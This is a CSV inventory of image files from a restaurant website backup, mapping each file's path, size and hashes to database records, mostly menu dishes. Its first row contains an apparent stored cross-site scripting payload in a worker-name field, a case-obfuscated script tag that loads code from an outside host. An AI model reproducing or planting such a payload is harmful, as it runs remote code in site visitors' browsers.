248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),prof_job_worker,248,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_img
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_small_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_small_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_small_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_small_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_small_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_small_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_small_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_small_img
256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_img
256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_small_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_small_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_small_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_img
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_small_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_small_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_small_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_small_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_small_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_small_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_small_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_small_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_small_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_img
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_small_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_small_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_small_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_small_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_small_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_small_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_small_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_small_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_small_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_small_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_small_img
280.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/280.jpeg,29532,57ac2bf6031476ac618948c5a3cd8bed65704381f5bbab78708823a6e13df3b1,b3a9e4af789bb658f3db9acf9b621214,DB Mapped (Verified),menu_item_tbl,280,Masala Dosa,menu_img
281.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/281.jpeg,6457,3001ae646e632e5914c23fe953b16fed26fdbab48de4e87bb5d044c481216e85,a92dacfda5c758ad2c9a0f3f92b8d132,DB Mapped (Verified),menu_item_tbl,281,Plain Dosa,menu_img
282.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/282.jpeg,9096,9afeead6eec0cb81ba293430e8f3d435ffe201862d177d5316d98034ed29cff5,4d645c54313c5463298019a7a89a9ad6,DB Mapped (Verified),menu_item_tbl,282,Butter Masala Dosa,menu_img
283.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/283.jpg,96688,de13a750d3703f64f06b4a009c7b034213101a68c500ca1806eb18ab5bab0b3f,d054f338341f4fe7cb4310558433eb27,DB Mapped (Verified),menu_item_tbl,283,Paper Dosa,menu_img
284.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/284.jpeg,8087,8677db934f26fa0d3aa498f4560058b68c2eafe868c98648fb540444e148d866,3632ac394aa4ef83ca825ecedda1169c,DB Mapped (Verified),menu_item_tbl,284,Paper Masala Dosa,menu_img
285.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/285.jpg,250766,e72711dcb4e99e47ce845dd88855742ddbdb848215dd5dfe3274a34939050755,d068851cc5d7f4e6d2c129bda384e025,DB Mapped (Verified),menu_item_tbl,285,Rawa Dosa,menu_img
286.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/286.jpg,59197,f9d81703b0dbe68bc328d97d8916f9664ca726a9c983fe57cede9089688c60ca,9df99bda86dd4ec2fbb71192d8834fe2,DB Mapped (Verified),menu_item_tbl,286,Rawa Vegetable Dosa,menu_img
287.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/287.jpg,58958,aaa44c9025a551c55700b8701303af4fe274e836969e4663bf7c01c5cf2aeba6,b7e3c15ce581d9e90d2a29079ce172f7,DB Mapped (Verified),menu_item_tbl,287,Tomato Uthapam,menu_img
288.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/288.jpeg,12144,416004634e81d74f7dc455c225f30ba499c5bde7776072546fbd5302de7d9096,bb9dd0e5aacf1fb5e9d01fa8b1612c5a,DB Mapped (Verified),menu_item_tbl,288,Mix Vegetable Uthapam,menu_img
289.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/289.jpeg,6195,107324934ea4301778f91bbe04cef42084be307d210bc1e0fbe006878dce1e4f,1b6a347ac5fc8cf1089de37b5d00e3fa,DB Mapped (Verified),menu_item_tbl,289,Idly Sambar,menu_img
29.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/29.jpeg,78689,1a0d1180e82403626ad1605de89d469f7b2b6c5c67ad862a6ded48b747175744,de34c77f69766f940a51c0538ab448c0,DB Mapped (Verified),menu_item_tbl,29,Upma,menu_img
290.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/290.jpeg,7746,fd01952b86f6f947f31978b0068f25726bc7e671bcdc2a2527b053883658d634,ecd450998f01563d797c6f631d6b94b8,DB Mapped (Verified),menu_item_tbl,290,Upma,menu_img
291.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/291.jpeg,7263,96f00e2a308fb7ff9b5ab56458cd59def2115e1043cb54f7e52caeb891a4721e,961e63dfac94281f40f61a8ae83b3db6,DB Mapped (Verified),menu_item_tbl,291,Coconut Chutney,menu_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_small_img
293.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/293.jpeg,10180,da630612ef709d0caa4c92714eb1881fb13d349512aa5322aac4876f68a528af,0796a7781c25cb30911f34ecf31d7ff5,DB Mapped (Verified),menu_item_tbl,293,Veg Wonton - China,menu_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_small_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_small_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_small_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_small_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_small_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_small_img
